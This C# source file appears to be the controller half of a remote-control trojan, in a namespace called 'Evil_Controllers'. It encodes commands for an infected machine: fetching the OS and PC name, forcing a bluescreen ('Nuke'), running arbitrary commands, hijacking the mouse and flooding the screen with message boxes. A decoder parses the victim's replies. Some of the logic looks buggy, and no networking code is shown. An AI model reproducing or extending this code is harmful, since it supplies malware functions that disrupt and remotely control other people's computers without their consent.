using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Evil_Controllers
{
    class Info
    {
        public string c_version,c_os,c_pc_name,c_error,c_p_sent,c_p_recv,c_ip_holder;
        public int p_sent, p_recv;
    }

    class Command
    {
        public string CMD_NAME;
        public List<CommandsPars> CMD_VARS = new List<CommandsPars>();

        public class CommandsPars
        {
            public string varName;
            public string varValue;
        }
    }

    class Encoder
    {
        //"MSspeed.10:MSrandom.true:MSmax.50"//

        //First 2 char is the command.
        //after it is the varible
        // . is the value of the varible
        //: is the end of the command

        //Be warned passing things that go beyong 1,000 bytes will cause an Exception to be called and crash.
        public Info info;
        public Packet packet;
        public void RequestVersion()
        {
            packet.strSend += "RV;";
        }
        public void RequestPing()
        {
            packet.strSend += "RP;";
        }
        public void RequestOS()
        {
            packet.strSend += "IN~os;";
        }
        public void RequestPCName()
        {
            packet.strSend += "IN~name;";
        }
        public void RequestOPacketSent()
        {
            packet.strSend += "IN~p_sent;";
        }
        public void RequestOPacketRecieved()
        {
            packet.strSend += "IN~p_recieved;";
        }
        public void Nuke()
        {
            packet.strSend += "NK~bluescreen=true;";
        }
        public void Command(string text)
        {
            packet.strSend += "CM~command=" + text.ToString() + ";";
        }
        public void Mouse(int speed, bool sgrade, bool srandom, int smax, int smin, bool lrandom,
            bool lscanx, bool lscany, bool linvX, bool linvY, int lrpulse)
        {
            Nuke();
            packet.strSend +=
                "MS~speed=" + speed +
                "~sgrade=" + sgrade +
                "~srandom=" + srandom +
                "~smax=" + smax +
                "~smin=" + smin +
                "~lrandom=" + lrandom +
                "~lscanx=" + lscanx +
                "~lscany=" + lscany +
                "~linvX=" + linvX +
                "~linvY=" + linvY +
                "~lrpulse=" + lrpulse +
                ";";
            Console.WriteLine(packet.strSend);
        }

        public void MessageBox(int type, int numBoxes, bool inf, string msg)
        {
            packet.strSend +=
                "MB~type=" + type +
                "~numBoxes=" + numBoxes +
                "~inf=" + inf +
                "~msg=" + msg +
                ";";
        }
    }

    class Decoder
    {
        public Info info;
        public Packet packet = new Packet();
        int i_seperator = 0, i_index = 0, c_ends = 0, c_ount = 0;
        string temp_string;
        Command cmdToAdd = new Command();
        List<Command> cmd_list = new List<Command>();

        /*public Scripts()
        {
            Thread thread = new Thread(new ThreadStart(mouse.Start));
            thread.Start();
        }*/

        public void Decode()
        {
            i_seperator = 0;
            c_ends = 0;
            try
            {
                c_ends = packet.strRecv.Count(x => x == ';');//Check how many instances of ';' are in the packet.
                Console.WriteLine("Packet:" + packet.strRecv);
                Console.WriteLine("Found " + c_ends + " cmd seperators");
                for (int i = 0; i < c_ends; i++)// make a loop equal to the amount of ';' which would signify a command
                {
                    cmdToAdd.CMD_NAME = "NULL";
                    temp_string = packet.strRecv.Substring(i_seperator, packet.strRecv.IndexOf(';', i_seperator + 1) - i_seperator + 1);
                    i_seperator = packet.strRecv.IndexOf(';', i_seperator) + 1;
                    i_index = 0;
                    Console.WriteLine("Seperated packet:" + temp_string);
                    while (temp_string.IndexOf(';') != i_index)
                    {
                        cmdToAdd.CMD_VARS.Add(new Command.CommandsPars());
                        cmdToAdd.CMD_VARS[c_ount].varName = "NULL";
                        cmdToAdd.CMD_VARS[c_ount].varValue = "NULL";

                        if (i_index == 0)
                        {
                            cmdToAdd.CMD_NAME = temp_string.Substring(0, 2);
                            Console.WriteLine("CMD" + i + ":" + cmdToAdd.CMD_NAME);
                            i_index = 2;
                        }
                        if (temp_string.IndexOf('~', i_index) != -1)
                        {

                            i_index = temp_string.IndexOf('~', i_index);
                            //Console.WriteLine("No second '~' found to substring with.\nLooking to substring with =");
                            try
                            {
                                cmdToAdd.CMD_VARS[c_ount].varName = temp_string.Substring(i_index + 1, temp_string.IndexOf('=', i_index) - i_index - 1);
                                i_index = temp_string.IndexOf('=', i_index);
                                Console.WriteLine("CMDNAME:" + cmdToAdd.CMD_VARS[c_ount].varName);
                                try
                                {
                                    cmdToAdd.CMD_VARS[c_ount].varValue = temp_string.Substring(i_index + 1, temp_string.IndexOf('~', i_index) - i_index - 1);
                                    Console.WriteLine("Value:" + cmdToAdd.CMD_VARS[c_ount].varValue);
                                    i_index = temp_string.IndexOf('~', i_index + 1);
                                }
                                catch
                                {
                                    try
                                    {
                                        cmdToAdd.CMD_VARS[c_ount].varValue = temp_string.Substring(i_index + 1, temp_string.IndexOf(';') - i_index - 1);
                                        Console.WriteLine("Value:" + cmdToAdd.CMD_VARS[c_ount].varValue);
                                        i_index = temp_string.IndexOf(';', i_index + 1);
                                    }
                                    catch
                                    {
                                        Console.WriteLine("Nothing found. Sending Error report.");
                                    }
                                }
                            }
                            catch (ArgumentOutOfRangeException)
                            {
                                try
                                {
                                    //No = found to substring with.\nAttempting to substring between two ~
                                    cmdToAdd.CMD_VARS[c_ount].varName = temp_string.Substring(i_index + 1, temp_string.IndexOf('~', i_index + 1) - i_index);
                                    i_index = temp_string.IndexOf('~', i_index + 1);
                                    Console.WriteLine("CMDNAME:" + cmdToAdd.CMD_VARS[c_ount].varName);
                                }
                                catch (ArgumentOutOfRangeException)
                                {
                                    //No = found to substring with.\nLooking to substring with ;
                                    try
                                    {
                                        cmdToAdd.CMD_VARS[c_ount].varName = temp_string.Substring(i_index + 1, temp_string.IndexOf(';') - i_index - 1);
                                        i_index = temp_string.IndexOf(';');
                                        Console.WriteLine("CMDNAME:" + cmdToAdd.CMD_VARS[c_ount].varName);
                                    }
                                    catch (ArgumentOutOfRangeException)
                                    {
                                        Console.WriteLine("Nothing found, sending error report.");
                                        packet.strRecv = "ER~message=No operators found to end or seperate packets with.#P1";
                                        packet.Toggle();
                                    }
                                }
                            }
                        }
                        else
                        {
                            //"No ~ found. Attempting to substring with ="
                            try
                            {
                                cmdToAdd.CMD_VARS[c_ount].varValue = temp_string.Substring(i_index, temp_string.IndexOf('~', i_index) - i_index);
                                i_index = temp_string.IndexOf('~', i_index + 1);
                                Console.WriteLine("Value:" + cmdToAdd.CMD_VARS[c_ount].varValue);
                                try
                                {
                                    cmdToAdd.CMD_VARS[c_ount].varName = temp_string.Substring(i_index, temp_string.IndexOf('=', i_index + 1) - i_index);
                                    i_index = temp_string.IndexOf('=', i_index + 1);
                                    Console.WriteLine("CMDNAME:" + cmdToAdd.CMD_VARS[c_ount].varName + "\nAttempting to extract value with ~");
                                }
                                catch (ArgumentOutOfRangeException)
                                {
                                    //No = found to seperate with.\nAttempting with ;
                                    try
                                    {
                                        cmdToAdd.CMD_VARS[c_ount].varName = temp_string.Substring(i_index, temp_string.IndexOf(';'));
                                        Console.WriteLine("CMD:" + cmdToAdd.CMD_NAME);
                                        i_index = temp_string.IndexOf(';');
                                    }
                                    catch (ArgumentOutOfRangeException)
                                    {
                                        Console.WriteLine("No ; found. Sending Error Report.");
                                        packet.strSend = "ER~messag=No way this happened.#P1";
                                        packet.Toggle();
                                    }
                                }
                            }
                            catch (ArgumentOutOfRangeException)
                            {
                                //Failed to get value with ~.\nAttempting to get value with ;
                                try
                                {
                                    if (i_index != temp_string.IndexOf(';'))
                                    {
                                        Console.WriteLine("Value:" + cmdToAdd.CMD_VARS[c_ount].varValue);
                                        cmdToAdd.CMD_VARS[c_ount].varValue = temp_string.Substring(i_index, temp_string.IndexOf(';') - i_index);
                                        i_index = temp_string.IndexOf(';');
                                        Console.WriteLine("Value2:" + cmdToAdd.CMD_VARS[c_ount].varValue);
                                    }
                                }
                                catch (ArgumentOutOfRangeException)
                                {
                                    Console.WriteLine("Failed to get anything. Sending Error Report.");
                                    packet.strSend = "ER~message=No operator to seperate with found #E1";
                                }
                            }
                        }
                        c_ount++;
                    }
                    cmd_list.Add(new Command());
                    cmd_list[i].CMD_NAME = cmdToAdd.CMD_NAME;
                    cmd_list[i].CMD_VARS = cmdToAdd.CMD_VARS.ToList();

                    Console.WriteLine(i + ":Saving CMD:" + cmdToAdd.CMD_NAME + "\nVName:" + cmdToAdd.CMD_VARS[0].varName + "\nVValue:" + cmdToAdd.CMD_VARS[0].varValue);
                    temp_string = "";
                    cmdToAdd.CMD_VARS.Clear();
                    c_ount = 0;
                    Console.WriteLine("New command added.\n");
                }
            }
            catch (ArgumentNullException)
            {
                Console.WriteLine("No end operator ';' found.");
                packet.strSend = "ER~message=Packet Error: Packet recieved without end operator;";
                packet.Toggle();
            }
            catch (OverflowException)
            {
                Console.WriteLine("Too many end operators ';', overflow caused.");
                packet.strSend = "ER~message=Packet Error: Too many end operators, overflow caused.;";
                packet.Toggle();
            }
        }

        public void ExecCommands()
        {
            for (int i = 0; i < cmd_list.Count; i++)
            {
                for (int o = 0; o < cmd_list[i].CMD_VARS.Count; o++)
                {
                    switch (cmd_list[i].CMD_NAME)
                    {
                        case "RV":
                            switch(cmd_list[i].CMD_VARS[o].varName)
                            {
                                case "number":
                                    info.c_version = String.Copy(cmd_list[i].CMD_VARS[o].varValue);
                                    break;
                            }
                            break;

                        case "RP":
                            switch (cmd_list[i].CMD_VARS[o].varName)
                            {
                                default:
                                    //Do somehting for ping lol
                                    break;
                            }
                            break;

                        case "IN":
                            switch (cmd_list[i].CMD_VARS[o].varName)
                            {
                                case "name":
                                    info.c_pc_name = String.Copy(cmd_list[i].CMD_VARS[o].varValue);
                                    break;
                                case "os":
                                    info.c_os = String.Copy(cmd_list[i].CMD_VARS[o].varValue);
                                    break;
                                case "p_sent":
                                    info.c_p_sent = String.Copy(cmd_list[i].CMD_VARS[o].varValue);
                                    break;
                                case "p_recieved":
                                    info.c_p_recv = String.Copy(cmd_list[i].CMD_VARS[o].varValue);
                                    break;
                            }
                            break;
                        case "ER"://Error handler
                            switch (cmd_list[i].CMD_VARS[o].varName)
                            {
                                default:
                                    info.c_error = "Error sent by client. No specification.";
                                    break;
                            }
                            break;
                        case "ON":
                            switch (cmd_list[i].CMD_VARS[o].varName)
                            {
                                default:
                                    break;
                            }
                            break;
                        case "":
                            switch (cmd_list[i].CMD_VARS[o].varName)
                            {
                                case "":
                                    break;
                            }
                            break;
                        /*
                           case "":
                            switch (cmd_list[i].CMD_VARS[o].varName)
                            {
                                case "":
                                    break;
                            }
                            break;
                         */
                    }
                }
            }
            cmd_list.Clear();
        }
    }

    class Scripts
    {
        public Packet packet;
        public Info info = new Info();
        public Encoder encoder = new Encoder();
        public Decoder decoder = new Decoder();
        public Scripts()
        {
            encoder.packet = packet;
            decoder.packet = packet;
            encoder.info = info;
            decoder.info = info;
        }
    }
}